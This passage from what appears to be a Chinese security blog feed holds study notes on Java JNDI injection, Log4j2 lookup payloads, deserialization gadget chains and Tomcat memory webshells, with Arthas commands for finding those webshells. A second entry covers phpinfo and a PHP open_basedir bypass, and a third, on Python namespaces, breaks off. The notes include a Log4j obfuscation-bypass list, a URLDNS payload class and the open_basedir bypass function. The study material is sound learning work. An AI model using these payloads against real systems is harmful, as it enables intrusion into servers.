EE</code>的重要部分，<code>JNDI</code>可访问的现有的目录及服务有:<code>JDBC</code>、<code>LDAP</code>、<code>RMI</code>、<code>DNS</code>、<code>NIS</code>、<code>CORBA</code>。</p><h2 id="什么是RMI"><a href="#什么是RMI" class="headerlink" title="什么是RMI"></a>什么是RMI</h2><p><code>RMI</code>全称是<code>Remote Method Invocation</code>（远程⽅法调⽤），目的是为了让两个隔离的java虚拟机，如虚拟机A能够调用到虚拟机B中的对象，而且这些虚拟机可以不存在于同一台主机上。</p><h2 id="什么是LDAP"><a href="#什么是LDAP" class="headerlink" title="什么是LDAP"></a>什么是LDAP</h2><p> <code>LDAP</code>，全称为 <code>Lightweight Directory Access Protocol</code>，即轻量级目录访问协议，主要用于资源查询。</p><h2 id="漏洞形成原因"><a href="#漏洞形成原因" class="headerlink" title="漏洞形成原因"></a>漏洞形成原因</h2><blockquote><p>JNDI支持从指定的远程服务器上下载class文件，加载到本地JVM中，并通过适当的方式创建对象。</p><p>如果目标应用进行了JNDI查询（<code>lookup</code>），并且其查询的地址或名称可控的话，就会形成JNDI注入漏洞</p></blockquote><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p><img src="/../images/%E6%97%A0%E6%A0%87%E9%A2%98-2023-05-01-1454-1682925503892.png" alt="image-20230502220549589"></p><ol><li><p>攻击者构造恶意协议，传入服务端（目标应用）</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">rmi:<span class="comment">//ip:port/name</span></span><br><span class="line">ldap:<span class="comment">//ip:port/name</span></span><br><span class="line">dns:<span class="comment">//外带.域名</span></span><br></pre></td></tr></table></figure></li><li><p>服务端连接到攻击者指定的服务，查询得到一个恶意的<code>JNDI Reference</code></p></li><li><p>服务端解析该恶意<code>JNDI Reference</code></p></li><li><p>根据解析结果到指定服务器上下载<code>Factory</code>的字节码</p></li><li><p>加载字节码，攻击者的恶意代码被执行</p></li></ol><h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><h4 id="低版本"><a href="#低版本" class="headerlink" title="低版本"></a>低版本</h4><p>服务端</p><p><img src="/../images/image-20230501151253546.png" alt="image-20230501151253546"></p><p>RMI服务</p><p><img src="/../images/image-20230501151418991.png" alt="image-20230501151418991"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(className,classFactor,classFactoryLocation)</span><br></pre></td></tr></table></figure><blockquote><p><code>className</code>：远程加载时所使用的类名<br><code>classFactor</code>：加载的 class 中需要实例化类的名称<br><code>classFactoryLocation</code>：提供classes数据的地址可以是 file&#x2F;ftp&#x2F;http 等协议</p></blockquote><p>存放恶意字节码的WEB服务器</p><p>恶意字节码对应的java文件<img src="/../images/image-20230501151607225.png" alt="image-20230501151607225"></p><p>先启动RMI服务和web服务器</p><p><img src="/../images/image-20230501152041695.png" alt="image-20230501152041695"></p><p><img src="/../images/image-20230501152052702.png" alt="image-20230501152052702"></p><p>再启动Server</p><p><img src="/../images/image-20230501152145871.png" alt="image-20230501152145871"></p><p><img src="/../images/image-20230501152116749.png" alt="image-20230501152116749"></p><h4 id="高版本"><a href="#高版本" class="headerlink" title="高版本"></a>高版本</h4><p><img src="/../images/image-20230502172305622.png" alt="image-20230502172305622"></p><p><code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认为 <code>false</code>，所以会进入 <code>if</code> 语句，抛出异常。</p><h5 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h5><p>原理</p><p>绕过抛出异常后进入<code>javax.naming.spi.NamingManager</code> </p><p><img src="/../images/image-20230502172806278.png" alt="image-20230502172806278"></p><p><img src="/../images/image-20230502173802695.png" alt="image-20230502173802695"></p><p>实现</p><p><code>Tomcat Server</code>中的<code>BeanFactory</code>类，通过该类的<code>getObjectInstance</code>方法反射调用了<code>javax.el.ELProcessor</code>的<code>eval</code>方法，最终实现了EL表达式执行达到RCE的效果。</p><h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><h4 id="低版本-1"><a href="#低版本-1" class="headerlink" title="低版本"></a>低版本</h4><p>同RMI，远程加载即可</p><h4 id="高版本-1"><a href="#高版本-1" class="headerlink" title="高版本"></a>高版本</h4><p>当从<code>LDAP Server</code>传来的对象是序列化对象时，会调用<code>readobject</code>方法，存在反序列化漏洞。</p><h3 id="版本影响"><a href="#版本影响" class="headerlink" title="版本影响"></a>版本影响</h3><p><code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认为 <code>false</code></p><p><img src="/../images/1586953-20210613173957090-164407195.png" alt="image-20230502220543519"></p><h2 id="Log4J2"><a href="#Log4J2" class="headerlink" title="Log4J2"></a>Log4J2</h2><p>Log4j是java用来处理日志的第三方组件，提供了<code>Lookups</code>的机制：</p><blockquote><p>会对日志中用 <code>$&#123;prefix:key&#125;</code>包裹起来的变量进行解析</p></blockquote><p><img src="/../images/image-20230426124656392.png" alt="image-20230426124656392"></p><p>当记录的信息为<code>$&#123;jndi:xxx&#125;</code>时,log4j2就会发起<code>JNDI Lookup</code>查询,从而触发JNDI注入漏洞。</p><p>payload</p><p><code>abc</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">a$&#123;:-b&#125;c</span><br><span class="line">$&#123;lower:b&#125;</span><br><span class="line">a$&#123;::-b&#125;c</span><br><span class="line">a$&#123;E:-a&#125;c</span><br><span class="line">a$&#123;:-$&#123;:-b&#125;&#125;c</span><br><span class="line">a$&#123;xxxanycodexxxx:-b&#125;c</span><br><span class="line">    </span><br><span class="line">unicode编码绕过</span><br><span class="line">插入空白字符绕过</span><br></pre></td></tr></table></figure><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>​在java中，如果要对一个对象进行序列化或者反序列化，那么这个对象的类必须要实现<code>java.io.Serializable</code>接口。</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>序列化<code>writeObject</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line"></span><br><span class="line">oos.writeObject(obj);</span><br></pre></td></tr></table></figure><p>反序列化<code>readObject</code> </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br></pre></td></tr></table></figure><h3 id="创建一个对象时各代码块的执行顺序"><a href="#创建一个对象时各代码块的执行顺序" class="headerlink" title="创建一个对象时各代码块的执行顺序"></a>创建一个对象时各代码块的执行顺序</h3><p><img src="/../images/image-20230503114055054.png" alt="image-20230503114055054"></p><p><code>static &#123;&#125;</code>  →  <code>&#123;&#125;</code>  →  构造函数</p><h3 id="serialVersionUID"><a href="#serialVersionUID" class="headerlink" title="serialVersionUID"></a>serialVersionUID</h3><p>反序列时, 如果字节流中的serialVersionUID与目标服务器对应类中的serialVersionUID不同时就会出现异常，造成反序列化失败。</p><p><img src="/../images/1615523079000-30cnxtq.png-w331s" alt="图片"></p><p>SUID不同是jar包版本不同所造成，不同版本jar包可能存在不同的计算方式导致算出的SUID不同，这种情况下只需要基于目标一样的jar包版本去生成payload即可解决异常，进而提升反序列化漏洞利用成功率。</p><h3 id="反序列化数据标志"><a href="#反序列化数据标志" class="headerlink" title="反序列化数据标志"></a>反序列化数据标志</h3><p><code>AC ED 00 05</code></p><p><img src="/../images/image-20230913163905803.png" alt="image-20230913163905803"></p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><p>分析的时候发现需要注释掉<code>ysoserial</code>重写的<img src="/../images/image-20230502230402644.png" alt="image-20230502230402644"></p><blockquote><p>ysoserial为了防⽌在⽣成Payload的时候也执⾏了URL请求和DNS查询，所以重写了⼀ 个 SilentURLStreamHandler 类。</p></blockquote><h4 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h4><p>如何寻找可能具有反序列化漏洞的类？</p><p>要有<code>readObject</code>方法，所以直奔<code>HashMap</code>的<code>readObject</code>方法</p><p><img src="/../images/image-20230502233642388.png" alt="image-20230502233642388"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>在<code>ysoserial</code>中打下断点</p><p><img src="/../images/image-20230502233910801.png" alt="image-20230502233910801"></p><p>跟进<code>put</code></p><p><img src="/../images/image-20230502233952861.png" alt="image-20230502233952861"></p><p>跟进<code>hash</code></p><p><img src="/../images/image-20230502234020014.png" alt="image-20230502234020014"></p><p>跟进<code>hashCode</code></p><p><img src="/../images/image-20230502234105324.png" alt="image-20230502234105324"></p><p>跟进<code>handler.hashCode</code></p><p><img src="/../images/image-20230502234135313.png" alt="image-20230502234135313"></p><p>跟进<code>getHostAddress</code></p><p><img src="/../images/image-20230502235424673.png" alt="image-20230502235424673"></p><p>这里多了一步，可能是版本问题吧？</p><p><img src="/../images/image-20230502234312446.png" alt="image-20230502234312446"></p><p>这⾥ InetAddress.getByName(host) 的作用是根据主机名，获取其IP地址，在网络上其实就是⼀次 DNS查询。</p><p><code>Gadget Chain</code></p><p><img src="/../images/image-20230502234635733.png" alt="image-20230502234635733"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">HashMap.hash()</span><br><span class="line">URL.hashCode()：Field hashCode=-<span class="number">1</span></span><br><span class="line">URLStreamHandler-&gt;hashCode()</span><br><span class="line">URLStreamHandler-&gt;getHostAddress()</span><br><span class="line">URL-&gt;getHostAddress()    </span><br><span class="line">InetAddress-&gt;getByName()</span><br></pre></td></tr></table></figure><p>需要实例化三个类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap</span><br><span class="line">URLStreamHandler</span><br></pre></td></tr></table></figure><p>无参构造，直接<code>new</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">URL</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230503000931008.png" alt="image-20230503000931008"></p><p>payload</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNSTestDemo</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLStreamHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://123.1020fd40.ipv6.1433.eu.org&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过反射修改私有属性hashCode为-1</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> u.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(u, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        hm.put(u, url);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230503001328190.png" alt="image-20230503001328190"></p><h3 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h3><p>CC&#x2F;CB&#x2F;7u21&#x2F;8u20</p><p>分析尝试阅读并魔改ysoserial</p><p>JEP 290是什么</p><p>JEP290是Java底层为了缓解反序列化攻击提出的一种解决方案，主要做了以下几件事</p><ol><li>提供一个限制反序列化类的机制，白名单或者黑名单。</li><li>限制反序列化的深度和复杂度。</li><li>为RMI远程调用对象提供了一个验证类的机制。</li><li>定义一个可配置的过滤机制，比如可以通过配置properties文件的形式来定义过滤器。</li></ol><h1 id="JAVA-Agent"><a href="#JAVA-Agent" class="headerlink" title="JAVA Agent"></a>JAVA Agent</h1><h1 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h1><p><a href="https://www.anquanke.com/post/id/279160#h3-1">内存马探究-安全客 - 安全资讯平台</a></p><p><a href="https://trrqsec.github.io/2022/04/10/Java%E5%AE%89%E5%85%A8-Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">Java安全-Tomcat内存马学习-信息安全博客</a></p><p><a href="http://wjlshare.com/archives/1529">Tomcat 内存马学习(一)：Filter型 – 天下大木头</a></p><p><a href="https://www.freebuf.com/articles/web/343105.html">Tomcat Filter 型内存马流程理解与手写 EXP - FreeBuf网络安全行业门户</a></p><p><a href="https://www.cnblogs.com/whgk/p/6399262.html">Java Web(一) Servlet详解！！ - 有梦想的老王 - 博客园</a></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p><img src="/../images/201909251250360.png" alt="在这里插入图片描述"></p><blockquote><p>客户端发起一个http请求，比如get类型。</p><p>Tomcat 作为Servlet容器,将http请求文本接收并解析，然后封装成HttpServletRequest类型的request对象，传递给servlet；</p><p>Servlet容器接收到请求，根据请求信息，封装成HttpServletRequest和HttpServletResponse对象。<br>Servlet容器调用HttpServlet的init()方法，init方法只在第一次请求的时候被调用。<br>Servlet容器调用service()方法。<br>service()方法根据请求类型，这里是get类型，分别调用doGet或者doPost方法，这里调用doGet方法。<br>doXXX方法中是我们自己写的业务逻辑。</p><p>业务逻辑处理完成之后，返回给Servlet容器，Servlet容器会将响应的信息封装为HttpServletResponse类型的response对象，然后将response交给tomcat，tomcat就会将其变成响应文本的格式发送给浏览器，然后容器将结果返回给客户端。</p><p>容器关闭时候，会调用destory方法</p></blockquote><p>Tomcat的配置</p><p><img src="/../images/v2-c3adc47d4c42dae472308ca19eb84374_720w.webp" alt="img"></p><ul><li>Server 元素表示整个 Catalina servlet 容器。</li><li>Service元素表示一个或多个连接器组件的组合，这些组件共享一个用于处理传入请求的引擎组件。Server 中可以有多个 Service。</li><li>Executor表示可以在Tomcat中的组件之间共享的线程池。</li><li>Connector代表连接组件。Tomcat 支持三种协议：HTTP&#x2F;1.1、HTTP&#x2F;2.0、AJP。</li><li>Context元素表示一个Web应用程序，它在特定的虚拟主机中运行。每个Web应用程序都基于Web应用程序存档（WAR）文件，或者包含相应的解包内容的相应目录，如Servlet规范述。</li><li>Engine元素表示与特定的Catalina服务相关联的整个请求处理机器。它接收并处理来自一个或多个连接器的所有请求，并将完成的响应返回给连接器，以便最终传输回客户端。</li><li>Host元素表示一个虚拟主机，它是一个服务器的网络名称（如“<a href="http://www.mycompany.com”)与运行tomcat的特定服务器的关联./">www.mycompany.com”）与运行Tomcat的特定服务器的关联。</a></li></ul><p><img src="/../images/1622447564_60b495cc4ddf6ab5c7b98.png!small" alt="img"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Engine，实现类为 org.apache.catalina.core.StandardEngine</span><br><span class="line">Host，实现类为 org.apache.catalina.core.StandardHost</span><br><span class="line">Context，实现类为 org.apache.catalina.core.StandardContext</span><br><span class="line">Wrapper，实现类为 org.apache.catalina.core.StandardWrapper</span><br></pre></td></tr></table></figure><p>Tomcat启动加载的顺序：Listener -&gt; Filter -&gt; Servlet</p><h2 id="传统web应用型"><a href="#传统web应用型" class="headerlink" title="传统web应用型"></a>传统web应用型</h2><h3 id="listener类型"><a href="#listener类型" class="headerlink" title="listener类型"></a>listener类型</h3><p>最终实例化出来的监听器被存储在 <code>applicationEventListenersList</code> 属性中</p><p>所以内存马构造中需要获取到 StandardContext 类，然后获取其applicationEventListenersList 属性，最后注入我们构造的恶意监听器到 applicationEventListenersList 属性里</p><h3 id="filter类型"><a href="#filter类型" class="headerlink" title="filter类型"></a>filter类型</h3><p><a href="http://wjlshare.com/archives/1529">Tomcat 内存马学习(一)：Filter型 – 天下大木头</a></p><p><strong>动态注册恶意 Filter，并且将其放到 <code>filterChain </code>的最前面</strong></p><h4 id="filter过滤器工作原理"><a href="#filter过滤器工作原理" class="headerlink" title="filter过滤器工作原理"></a>filter过滤器工作原理</h4><p><img src="/../images/image-20210331212905616.png" alt="image-20210331212905616"></p><ol><li>根据请求的 URL 从 <code>FilterMaps</code> 中遍历<code>FilterMap</code>找出与之 URL 对应的 Filter 名称</li><li>根据 Filter 名称去 <code>FilterConfigs</code> 中寻找对应名称的 <code>FilterConfig</code></li><li>找到对应的 <code>FilterConfig</code> 之后添加到<code> FilterChain</code>中，并且返回 <code>FilterChain</code></li><li><code>filterChain </code>中调用 <code>internalDoFilter</code> 遍历获取 chain 中的 <code>FilterConfig </code>，然后从<code> FilterConfig</code> 中获取 Filter，然后调用 Filter 的 doFilter 方法</li></ol><blockquote><p>关键点在于<code>FilterMap</code>和<code>FilterConfig</code>，如果我们可以控制这两个变量，我们就可以任意注册filter。</p><p>他们存储在<code>StandardContext</code>的属性<code>FilterMaps</code>和<code>FilterConfigs</code>中，而<code>StandardContext</code>是可以获得的，<code>filterconfig</code>中需要添加的<code>filterdef</code>也是我们可控的，综上filter动态添加过程是我们可操控的。</p></blockquote><p><img src="/../images/image-20230424230657970.png" alt="image-20230424230657970"></p><ul><li><p><code>filterConfigs</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">存放filterConfig的数组，在 FilterConfig 中主要存放 FilterDef 和 Filter对象等信息</span><br></pre></td></tr></table></figure></li><li><p><code>filterDefs</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">存放FilterDef的数组 ，FilterDef 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息</span><br></pre></td></tr></table></figure></li><li><p><code>filterMaps</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">存放FilterMap的数组，在 FilterMap 中主要存放了 FilterName 和 对应的URLPattern</span><br></pre></td></tr></table></figure></li></ul><p>思路：</p><ol><li>创建一个恶意 Filter</li><li>利用 FilterDef 对 Filter 进行一个封装</li><li>将 FilterDef 添加到 FilterDefs 和 FilterConfig</li><li>创建 FilterMap ，将我们的 Filter 和 urlpattern 相对应，存放到 filterMaps中（由于 Filter 生效会有一个先后顺序，所以我们一般都是放在最前面，让我们的 Filter 最先触发）</li></ol><p><img src="/../images/image-20230424231859397.png" alt="image-20230502220543589"></p><h3 id="servlet类型"><a href="#servlet类型" class="headerlink" title="servlet类型"></a>servlet类型</h3><p>工作流程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">装载：启动服务器时加载Servlet的实例</span><br><span class="line"></span><br><span class="line">初始化：web服务器启动时或web服务器接收到请求时，或者两者之间的某个时刻启动。初始化工作有init()方法负责执行完成</span><br><span class="line"></span><br><span class="line">调用：即每次调用Servlet的service()，从第一次到以后的多次访问，都是只是调用doGet()或doPost()方法（doGet、doPost内部实现，具体参照HttpServlet类service()的重写）</span><br><span class="line"></span><br><span class="line">销毁：停止服务器时调用destroy()方法，销毁实例</span><br></pre></td></tr></table></figure><p>Servlet需要重写doGet和doPost</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 通过 context.createWapper() 创建 Wapper 对象；</span><br><span class="line"></span><br><span class="line">2. 设置 Servlet 的 LoadOnStartUp 的值；（优先级）</span><br><span class="line"></span><br><span class="line">3. 设置 Servlet 的 Name；</span><br><span class="line"></span><br><span class="line">4. 设置 Servlet 对应的 Class；</span><br><span class="line"></span><br><span class="line">5. 将 Servlet 添加到 context 的 children 中；</span><br><span class="line"></span><br><span class="line">6. 将 url 路径和 servlet 类做映射。</span><br></pre></td></tr></table></figure><h2 id="排查"><a href="#排查" class="headerlink" title="排查"></a>排查</h2><p>阿里巴巴的Java诊断工具–阿尔萨斯</p><p>注意启动用的java版本要和启动tomcat的java版本一致，用户一致。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">servelt</span></span><br><span class="line">mbean | grep &quot;name=/&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">filter</span></span><br><span class="line">sc *.Filter # 模糊搜索，列出所有调用了 Filter 的类</span><br><span class="line">sc -d org.apache.coyote.module.SimpleSerializers # classloader</span><br><span class="line"></span><br><span class="line">classloader # 查看类加载器加载了哪些类</span><br><span class="line"></span><br><span class="line">jad --source-only org.apache.jsp.evil_jsp # 反编译类</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">终极排查 heapdump</span></span><br><span class="line">heapdump</span><br><span class="line">strings /var/cache/tomcat/temp/heapdump2022-10-19-12-464292342944555007800.hprof | grep &quot;POST /&quot;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230503204528006.png" alt="image-20230503204528006"></p><p><img src="/../images/image-20230426163320217.png" alt="image-20230426163320217"></p><p>动态注册，对比<code>web.xml</code>中的配置</p><h1 id="报错解决"><a href="#报错解决" class="headerlink" title="报错解决"></a>报错解决</h1><p><a href="https://blog.csdn.net/qq_22076345/article/details/82392236">(69条消息) Intellij idea 报错：Error : java 不支持发行版本5_idea错误不支持发行版本5_灵颖桥人的博客-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>phpinfo中的信息</title>
      <link href="/2023/05/01/phpinfo/"/>
      <url>/2023/05/01/phpinfo/</url>
      
        <content type="html"><![CDATA[<h1 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h1><p><a href="https://www.php.net/manual/zh/ini.core.php">PHP: php.ini 核心指令说明 - Manual</a></p><p>ini_set()</p><p><a href="https://www.php.net/manual/zh/ini.list.php">https://www.php.net/manual/zh/ini.list.php</a></p><h1 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h1><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><a href="https://www.k0rz3n.com/2019/02/12/PHPINFO%20%E4%B8%AD%E7%9A%84%E9%87%8D%E8%A6%81%E4%BF%A1%E6%81%AF/">phpinfo中的重要信息</a></p><table><thead><tr><th align="center">变量</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">open_basedir</td><td align="center">限制目录访问（可以绕过）</td></tr><tr><td align="center">disable_function</td><td align="center">禁用函数（可以绕过）</td></tr><tr><td align="center">session.save_path</td><td align="center">配合文件包含</td></tr><tr><td align="center">_SERVER</td><td align="center">各种主机信息</td></tr><tr><td align="center">pecl</td><td align="center">confing.php写🐎</td></tr></tbody></table><h2 id="open-basedir绕过"><a href="#open-basedir绕过" class="headerlink" title="open_basedir绕过"></a>open_basedir绕过</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">在index.php下</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line">所以如果用户通过index.php来访问服务器时，只能访问/<span class="keyword">var</span>/www/html/</span><br></pre></td></tr></table></figure><p><a href="https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/">open_basedir绕过</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bypass_open_basedir</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;bypass_open_basedir&#x27;</span>))&#123;</span><br><span class="line">                <span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;bypass_open_basedir&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;bypass_open_basedir&#x27;</span>);</span><br><span class="line">        @<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">        @<span class="variable">$_Ei34Ww_sQDfq_FILENAME</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>]);</span><br><span class="line">        @<span class="variable">$_Ei34Ww_sQDfq_path</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\\&quot;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="variable">$_Ei34Ww_sQDfq_FILENAME</span>);</span><br><span class="line">        @<span class="variable">$_Ei34Ww_sQDfq_num</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$_Ei34Ww_sQDfq_path</span>,<span class="string">&#x27;/&#x27;</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="variable">$_Ei34Ww_sQDfq_i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$_Ei34Ww_sQDfq_i</span> &lt; <span class="variable">$_Ei34Ww_sQDfq_num</span>)&#123;</span><br><span class="line">                @<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">                <span class="variable">$_Ei34Ww_sQDfq_i</span>++;</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        @<span class="title function_ invoke__">rmdir</span>(<span class="variable">$_Ei34Ww_sQDfq_FILENAME</span>.<span class="string">&#x27;/&#x27;</span>.<span class="string">&#x27;bypass_open_basedir&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="disable-function绕过"><a href="#disable-function绕过" class="headerlink" title="disable_function绕过"></a>disable_function绕过</h2><p>如何设置<code>disable_function</code></p><blockquote><p>在php配置文件php.ini中设置</p></blockquote><p>绕过：<a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions</a></p><p>​<a href="https://www.freebuf.com/articles/network/263540.html">https://www.freebuf.com/articles/network/263540.html</a></p><p>常见的webshell管理工具都自带相关绕过的模块。</p><h2 id="配合文件包含Getshell"><a href="#配合文件包含Getshell" class="headerlink" title="配合文件包含Getshell"></a>配合文件包含Getshell</h2>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python命名空间</title>
      <link href="/2023/05/01/python%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/"/>
      <url>/2023/05/01/python%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/</url>
      
        <content type="html"><![CDATA[<p>From：<a href="https://www.bilibili.com/video/BV12F411t78n">https://www.bilibili.com/video/BV12F411t78n</a></p><p>开头说了一段话</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">lf you import another module, it will have its global scope</span><br><span class="line">每个模块都有自己的全局空间</span><br><span class="line">Each function has its local scope</span><br><span class="line">每个函数都有自己的局部空间</span><br><span class="line">Every time the function is called, a new scope is created</span><br><span class="line">每当函数被调用时，就会创建一个空间给它使用</span><br><span class="line">Certain Python objects like &#x27;print&#x27; function, &#x27;None&#x27;,&#x27;True&#x27;, &#x27;False&#x27;, are available everywhere in your program and they are in the built-in scope</span><br><span class="line">python内置的函数在程序的任何一个空间都是可以使用的，它们存在于built-in空间中。</span><br><span class="line">The variables or name bindings are stored in namespaces</span><br><span class="line">变量和函数地址都存储在命名空间中</span><br></pre></td></tr></table></figure><p>这是我根据视频的画的，左边的global空间是socket模块的，右边的global空间是我们程序的（我给它起了叫original）</p><img src="E:\typora 